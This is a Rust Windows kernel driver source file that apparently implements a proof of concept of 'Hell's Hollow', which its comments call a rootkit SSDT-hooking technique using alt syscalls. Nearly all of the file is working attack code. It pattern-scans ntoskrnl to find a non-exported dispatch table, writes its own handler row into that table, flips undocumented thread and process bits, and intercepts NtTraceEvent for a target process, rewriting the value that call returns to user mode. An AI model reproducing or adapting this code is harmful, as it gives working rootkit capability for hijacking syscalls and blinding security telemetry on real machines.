use core::{arch::asm, ffi::c_void, ptr::null_mut};

use alloc::{boxed::Box, string::String, vec::Vec};
use wdk::println;
use wdk_sys::{
    _KTRAP_FRAME,
    _MODE::KernelMode,
    ACCESS_MASK, DISPATCHER_HEADER, DRIVER_OBJECT, HANDLE, NTSTATUS, OBJ_KERNEL_HANDLE, PETHREAD,
    PHANDLE, PKTHREAD, PROCESS_ALL_ACCESS, PsThreadType, THREAD_ALL_ACCESS, ULONG,
    ntddk::{
        IoGetCurrentProcess, IoThreadToProcess, ObReferenceObjectByHandle, ObfDereferenceObject,
        ZwClose,
    },
};

use crate::utils::{
    DriverError, get_module_base_and_sz, scan_module_for_byte_pattern, thread_to_process_name,
};

unsafe extern "system" {
    pub unsafe fn PsGetProcessImageFileName(p_eprocess: *const c_void) -> *const c_void;
}

unsafe extern "system" {
    pub unsafe fn ZwGetNextProcess(
        handle: HANDLE,
        access: ACCESS_MASK,
        attr: ULONG,
        flags: ULONG,
        new_proc_handle: PHANDLE,
    ) -> NTSTATUS;

    pub unsafe fn ZwGetNextThread(
        proc_handle: HANDLE,
        thread_handle: HANDLE,
        access: ACCESS_MASK,
        attr: ULONG,
        flags: ULONG,
        new_thread_handle: PHANDLE,
    ) -> NTSTATUS;
}

const SLOT_ID: u32 = 0;
const SSN_COUNT: usize = 0x500;

const NT_TRACE_EVENT_SSN: u32 = 0x005e;

pub struct AltSyscalls;

#[repr(C)]
pub struct PspServiceDescriptorGroupTable {
    rows: [PspServiceDescriptorRow; 0x20],
}

#[repr(C)]
#[derive(Copy, Clone)]
struct PspServiceDescriptorRow {
    driver_base: *const c_void,
    ssn_dispatch_table: *const AltSyscallDispatchTable,
    _reserved: *const c_void,
}

#[repr(C)]
struct PspSyscallProviderDispatchContext {
    level: u32,
    slot: u32,
}

#[repr(C)]
struct AltSyscallDispatchTable {
    pub count: u64,
    pub descriptors: [u32; SSN_COUNT],
}

#[derive(Copy, Clone)]
pub enum AltSyscallStatus {
    Enable,
    Disable,
}

/// The actual PoC for Hell's Hollow can be found here. For full reference:
/// https://fluxsec.red/hells-hollow-a-new-SSDT-hooking-technique-with-alt-syscalls-rootkit
/// 
/// # Note
/// We make sure to inline the function here, as it just helps easily calculate the stack required for the entire
/// callback routine for Alt Syscalls. Keeps it to 1 stack frame.
#[inline(always)]
fn hells_hollow_poc() -> Result<i32, ()> {
    let proc_name = get_process_name().to_lowercase();

    //
    // Note: For the purposes of this, we are only operating on processes with hello_world
    // in their process name. This helps isolate the investigation.
    //
    if proc_name.contains("hello_world") {
        println!("Found target process {proc_name}");

        let mut current_rsp_val: u64 = 0;

        unsafe {
            asm!(
                "mov {out}, rsp",
                out = out(reg) current_rsp_val,
                options(nomem, nostack, preserves_flags),
            );
        }

        // rsp + offset of stack frames to our callback + the stack size of the callback handler
        const STACK_DEPTH_FROM_KI_SYSTEM_CALL: u64 = 0x168;
        const CALLBACK_STACK_SIZE: u64 = 0x3D8; // stack depth of the CALLBACK this is why inlining here helps
        let trap_addr = (current_rsp_val + STACK_DEPTH_FROM_KI_SYSTEM_CALL + CALLBACK_STACK_SIZE)
            as *mut _KTRAP_FRAME;

        println!("Stack address of the KTRAP_FRAME: {:p}", trap_addr);

        let ktrap: _KTRAP_FRAME = unsafe { *trap_addr };

        // change the return value to usermode
        unsafe { (*trap_addr).P3Home = 0xff };

        // print the SSN
        println!("Current value of rax: {:X}", ktrap.Rax);

        return Ok(0);
    }

    Ok(1)
}

impl AltSyscalls {
    /// Initialises the required tables in memory.
    ///
    /// This function should only be called once until it is disabled.
    pub fn initialise_for_system(driver: &mut DRIVER_OBJECT) {
        // How many stack args we want to memcpy; I use my own method to get these..
        const NUM_QWORD_STACK_ARGS_TO_CPY: u32 = 0x0;
        // These flags ensure we go the PspSyscallProviderServiceDispatchGeneric route
        const GENERIC_PATH_FLAGS: u32 = 0x10;

        // Enforce the SLOT_ID rules at compile time
        const _: () = assert!(SLOT_ID <= 20, "SLOT_ID for alt syscalls cannot be > 20");

        //
        // Get the base address of the driver, so that we can bit shift in the RVA of the callback.
        //
        let driver_base = match get_module_base_and_sz("hells_hollow.sys") {
            Ok(info) => info.base_address,
            Err(e) => {
                println!("[-] Could not get base address of driver. {:?}", e);
                return;
            }
        };

        //
        // Now build the 'mini dispatch table':  one per descriptor. Each index of the descriptor contains a relative pointer from the driver base
        // address to the callback function.
        //
        // low–4 bits   = metadata (0x10 = generic path + N args to capture via a later memcpy),
        // high bits    = descriptor index<<4.
        //
        // Setting FLAGS |= (METADATA & 0xF) means generic path, capture N args
        //
        let callback_address = syscall_handler as usize;
        let metadata_table = Box::new(AltSyscallDispatchTable {
            count: SSN_COUNT as _,
            descriptors: [0; SSN_COUNT],
        });

        // Leak the box so that we don't (for now) have to manage the memory; yes, this is a memory leak in the kernel, I'll fix it later.
        let p_metadata_table = Box::leak(metadata_table) as *const AltSyscallDispatchTable;

        let rva_offset_callback = callback_address - driver_base as usize;
        // SAFETY: Check the offset size will fit into a u32
        if rva_offset_callback > u32::MAX as _ {
            println!(
                "OFfset calculation very wrong? Offset: {:#x}",
                rva_offset_callback
            );
            return;
        }

        for i in 0..SSN_COUNT {
            unsafe { &mut *(p_metadata_table as *mut AltSyscallDispatchTable) }.descriptors[i] =
                ((rva_offset_callback as u32) << 4)
                    | (GENERIC_PATH_FLAGS | (NUM_QWORD_STACK_ARGS_TO_CPY & 0xF));
        }

        println!(
            "Address of the alt syscalls metadata table: {:p}",
            p_metadata_table
        );

        // Get the address of PspServiceDescriptorGroupTable from the kernel by doing some pattern matching; I don't believe
        // we can link to the symbol.
        let kernel_service_descriptor_table = match lookup_global_table_address(driver) {
            Ok(t) => t as *mut PspServiceDescriptorGroupTable,
            Err(_) => {
                println!("failed to find kernel table");
                return;
            }
        };

        //
        // Insert a new row at index 0 in the PspServiceDescriptorGroupTable; in theory, if these were already occupied by other software
        // using alt syscalls, we would want to find an unoccupied slot.
        // This is what the Slot field relates to on the _PSP_SYSCALL_PROVIDER_DISPATCH_CONTEXT of _EPROCESS - essentially an index into which
        // syscall provider to use.
        //
        let new_row = PspServiceDescriptorRow {
            driver_base,
            ssn_dispatch_table: p_metadata_table,
            _reserved: core::ptr::null(),
        };

        // Write it to the table
        unsafe {
            (*kernel_service_descriptor_table).rows[SLOT_ID as usize] = new_row;
        }

        // Enumerate all active processes and threads, and enable the relevant bits so that the alt syscall 'machine' can work :)
        Self::walk_active_processes_and_set_bits(AltSyscallStatus::Enable, Some(&["hello_world"]));
    }

    /// Sets the required context bits in memory on thread and KTHREAD.
    pub fn configure_thread_for_alt_syscalls(p_k_thread: PKTHREAD, status: AltSyscallStatus) {
        if p_k_thread.is_null() {
            return;
        }

        // Check if is pico process, if it is, we don't want to mess with it, as I haven't spent time reversing the branch
        // for this in PsSyscallProviderDispatch.
        let dispatch_hdr = unsafe { &mut *(p_k_thread as *mut DISPATCHER_HEADER) };

        if unsafe {
            dispatch_hdr
                .__bindgen_anon_1
                .__bindgen_anon_6
                .__bindgen_anon_2
                .DebugActive
                & 4
        } == 4
        {
            return;
        }

        // Assuming now we are not a pico-process; set / unset the AltSyscall bit on the ETHREAD depending upon
        // the `status` argument to this function.
        unsafe {
            match status {
                AltSyscallStatus::Enable => {
                    dispatch_hdr
                        .__bindgen_anon_1
                        .__bindgen_anon_6
                        .__bindgen_anon_2
                        .DebugActive |= 0x20
                }
                AltSyscallStatus::Disable => {
                    dispatch_hdr
                        .__bindgen_anon_1
                        .__bindgen_anon_6
                        .__bindgen_anon_2
                        .DebugActive &= !0x20
                }
            }
        }
    }

    pub fn configure_process_for_alt_syscalls(p_k_thread: PKTHREAD) {
        // We can cast the KTHREAD* as a ETHREAD* as KTHREAD = ETHREAD bytes 0x0 - 0x4c0
        // so they directly map.
        // We will cast the resulting EPROCESS as a *mut u8 as EPROCESS is not defined by the Windows API, and we can just use
        // some pointer arithmetic to edit the fields we want.
        let p_eprocess = unsafe { IoThreadToProcess(p_k_thread as PETHREAD) } as *mut u8;
        let syscall_provider_dispatch_ctx: &mut PspSyscallProviderDispatchContext =
            if !p_eprocess.is_null() {
                unsafe {
                    let addr = p_eprocess.add(0x7d0) as *mut PspSyscallProviderDispatchContext;
                    // SAFETY: I think the dereference of this is fine; we are dereferencing an offset from the EPROCESS - it is not a double pointer.
                    // We check the validity of the EPROCESS above before doing this, as that should always be valid. But this deref should be safe.
                    &mut *addr
                }
            } else {
                return;
            };

        // Set slot id
        syscall_provider_dispatch_ctx.slot = SLOT_ID;
    }

    /// Uninstall the Alt Syscall handlers from the kernel.
    pub fn uninstall() {
        Self::walk_active_processes_and_set_bits(AltSyscallStatus::Disable, Some(&["hello_world"]));
    }

    /// Walk all processes and threads, and set the bits on the process & thread to either enable or disable the
    /// alt syscall method.
    ///
    /// # Args:
    /// - `status`: Whether you wish to enable, or disable the feature
    /// - `isolated_processes`: If you wish just to set the relevant bits on a single process; then add a vec of process names
    /// to match on, with a *name* logic.
    ///
    /// # Note:
    /// This function is specifically crafted for W11 24H2; to generalise in the future after POC
    fn walk_active_processes_and_set_bits(
        status: AltSyscallStatus,
        isolated_processes: Option<&[&str]>,
    ) {
        let current_process = unsafe { IoGetCurrentProcess() };
        if current_process.is_null() {
            println!("current_process was NULL");
            return;
        }

        //
        // Walk the active processes & threads via reference counting to ensure that the
        // threads & processes aren't terminated during the walk (led to race condition).
        //
        // For each process & thread, enable to relevant bits for Alt Syscalls.
        //

        let mut next_proc: HANDLE = null_mut();
        let mut cur_proc: HANDLE = null_mut();
        let mut cur_thread: HANDLE = null_mut();
        let mut next_thread: HANDLE = null_mut();

        // Store a vec of handles to be closed after we have completed all operations
        let mut handles: Vec<HANDLE> = Vec::new();

        loop {
            let result = unsafe {
                ZwGetNextProcess(
                    cur_proc,
                    PROCESS_ALL_ACCESS,
                    OBJ_KERNEL_HANDLE,
                    0,
                    &mut next_proc,
                )
            };

            if result != 0 || cur_proc == next_proc {
                break;
            }

            cur_proc = next_proc;

            // Now walk the threads of the process
            loop {
                let result = unsafe {
                    ZwGetNextThread(
                        cur_proc,
                        cur_thread,
                        THREAD_ALL_ACCESS,
                        OBJ_KERNEL_HANDLE,
                        0,
                        &mut next_thread,
                    )
                };

                if result != 0 || cur_thread == next_thread {
                    break;
                }

                cur_thread = next_thread;

                let mut pe_thread: *mut c_void = null_mut();

                let _ = unsafe {
                    ObReferenceObjectByHandle(
                        cur_thread,
                        THREAD_ALL_ACCESS,
                        *PsThreadType,
                        KernelMode as _,
                        &mut pe_thread,
                        null_mut(),
                    )
                };

                if !pe_thread.is_null() {
                    // Before we actually go ahead and set the bits; we wanna check whether the caller is requesting the bits
                    // set ONLY on certain processes. The below logic will check whether that argument is Some, and if so,
                    // check the process information to set the bits.
                    // If it is `None`, we will skip the check and just set all process & thread info

                    if let Some(proc_vec) = &isolated_processes {
                        match thread_to_process_name(pe_thread as *mut _) {
                            Ok(current_process_name) => {
                                for needle in proc_vec.into_iter() {
                                    if current_process_name
                                        .to_lowercase()
                                        .contains(&needle.to_lowercase())
                                    {
                                        println!("Process name found for alt syscalls: {}", needle);
                                        Self::configure_thread_for_alt_syscalls(
                                            pe_thread as *mut _,
                                            status,
                                        );
                                        Self::configure_process_for_alt_syscalls(
                                            pe_thread as *mut _,
                                        );
                                    }
                                }
                            }
                            Err(e) => {
                                println!(
                                    "Unable to get process name to set alt syscall bits on targeted process. {:?}",
                                    e
                                );
                                let _ = unsafe { ObfDereferenceObject(pe_thread) };
                                continue;
                            }
                        }
                    }

                    Self::configure_thread_for_alt_syscalls(pe_thread as *mut _, status);
                    Self::configure_process_for_alt_syscalls(pe_thread as *mut _);

                    let _ = unsafe { ObfDereferenceObject(pe_thread) };
                }

                handles.push(cur_thread);
            }

            // Reset so we can walk the threads again on the next process
            cur_thread = null_mut();

            handles.push(cur_proc);
        }

        // Close the handles to dec the ref count
        for handle in handles {
            let _ = unsafe { ZwClose(handle) };
        }
    }
}

/// The callback routine which we control to run when a system call is dispatched via alt syscalls.
/// It follows here, that we are able to use Hells Hollow to act as a SSDT hook.
pub unsafe extern "system" fn syscall_handler(
    _p_nt_function: c_void,
    ssn: u32,
    args_base: *const c_void,
    p3_home: *const c_void,
) -> i32 {
    if args_base.is_null() || p3_home.is_null() {
        println!("Args base or arg4 was null??");
        return 1;
    }

    match ssn {
        NT_TRACE_EVENT_SSN => {
            if let Ok(val) = hells_hollow_poc() {
                return val;
            }
        }
        _ => (),
    }

    1
}

/// Get the address of the non-exported kernel symbol: `PspServiceDescriptorGroupTable`
fn lookup_global_table_address(_driver: &DRIVER_OBJECT) -> Result<*mut c_void, DriverError> {
    let module = match get_module_base_and_sz("ntoskrnl.exe") {
        Ok(k) => k,
        Err(e) => {
            println!("Unable to get kernel base address. {:?}", e);
            return Err(DriverError::ModuleNotFound);
        }
    };

    let fn_address = scan_module_for_byte_pattern(
        module.base_address,
        module.size_of_image,
        &[
            // from nt!PsSyscallProviderDispatch
            0x48, 0x89, 0x5c, 0x24, 0x08, //mov     qword ptr [rsp+8], rbx
            0x55, // push    rbp
            0x56, // push    rsi
            0x57, // push    rdi
            0x41, 0x56, // push    r14
            0x41, 0x57, // push    r15
            0x48, 0x83, 0xec, 0x30, // sub     rsp, 30h
            0x48, 0x83, 0x64, 0x24, 0x70, 0x00, // and     qword ptr [rsp+70h], 0
            0x48, 0x8b, 0xf1, // mov     rsi, rcx
            0x65, 0x48, 0x8b, 0x2c, 0x25, 0x88, 0x01, 0x00,
            0x00, // mov     rbp, qword ptr gs:[188h]
            0xf6, 0x45, 0x03, 0x04, // test    byte ptr [rbp+3], 4
        ],
    )? as *const u8;

    // offset from fn
    let instruction_address = unsafe { fn_address.add(0x77) };

    println!(
        "Instruction address to get offset: {:p}",
        instruction_address
    );

    let disp32 =
        unsafe { core::ptr::read_unaligned((instruction_address.add(3)) as *const i32) } as isize;
    let next_rip = instruction_address as isize + 7;
    let absolute = (next_rip + disp32) as *const c_void;

    println!("Address of PspServiceDescriptorGroupTable: {:p}", absolute);

    Ok(absolute as *mut _)
}

#[inline(always)]
fn get_process_name() -> String {
    let mut pkthread: *mut c_void = null_mut();

    unsafe {
        asm!(
            "mov {}, gs:[0x188]",
            out(reg) pkthread,
        )
    };
    let p_eprocess = unsafe { IoThreadToProcess(pkthread as PETHREAD) } as *mut c_void;

    let mut img = unsafe { PsGetProcessImageFileName(p_eprocess) } as *const u8;
    let mut current_process_thread_name = String::new();
    let mut counter: usize = 0;
    while unsafe { core::ptr::read_unaligned(img) } != 0 || counter < 15 {
        current_process_thread_name.push(unsafe { *img } as char);
        img = unsafe { img.add(1) };
        counter += 1;
    }

    current_process_thread_name
}
